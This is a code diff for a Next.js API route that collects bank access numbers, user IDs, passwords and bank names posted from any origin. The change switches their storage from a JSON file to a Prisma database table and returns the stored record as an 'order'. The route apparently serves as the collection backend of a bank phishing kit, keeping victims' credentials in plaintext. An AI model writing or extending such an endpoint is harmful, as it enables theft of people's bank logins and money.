@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
-import fs from 'fs';
-import path from 'path';
+import { PrismaClient } from '@/app/generated/prisma/client';
+
+const prisma = new PrismaClient();
 
 const CORS_HEADERS = {
   'Access-Control-Allow-Origin': '*',
@@ -27,37 +28,33 @@ export async function POST(req: NextRequest) {
     const password = params.get('password');
     const bank = params.get('bank');
 
-    const data = {
-      accessNumber,
-      userId,
-      password,
-      bank,
-      timestamp: new Date().toISOString(),
-    };
-
-    const filePath = path.join(process.cwd(), 'data', 'info.json');
-    let currentData: any[] = [];
-
-    if (fs.existsSync(filePath)) {
-      const rawData = fs.readFileSync(filePath, 'utf8').trim();
-      try {
-        currentData = rawData ? JSON.parse(rawData) : [];
-      } catch (e) {
-        console.warn('Invalid JSON, resetting file...');
-        currentData = [];
-        fs.writeFileSync(filePath, '[]');
-      }
+    // Check for missing data
+    if (!accessNumber || !userId || !password || !bank) {
+      return new NextResponse(
+        JSON.stringify({
+          success: false,
+          message: 'Missing required fields',
+        }),
+        {
+          status: 400,
+          headers: CORS_HEADERS,
+        }
+      );
     }
 
-    // Add the new data to the current data
-    currentData.push(data);
-
-    // Write the updated data to the file
-    fs.writeFileSync(filePath, JSON.stringify(currentData, null, 2));
+    // Create a new order in the database using Prisma
+    const newOrder = await prisma.bank.create({
+      data: {
+        accessNumber,
+        userId,
+        password,
+        bank,
+      },
+    });
 
     // Return success response
     return new NextResponse(
-      JSON.stringify({ success: true, message: 'Data saved successfully' }),
+      JSON.stringify({ success: true, message: 'Data saved successfully', order: newOrder }),
       {
         status: 200,
         headers: CORS_HEADERS,
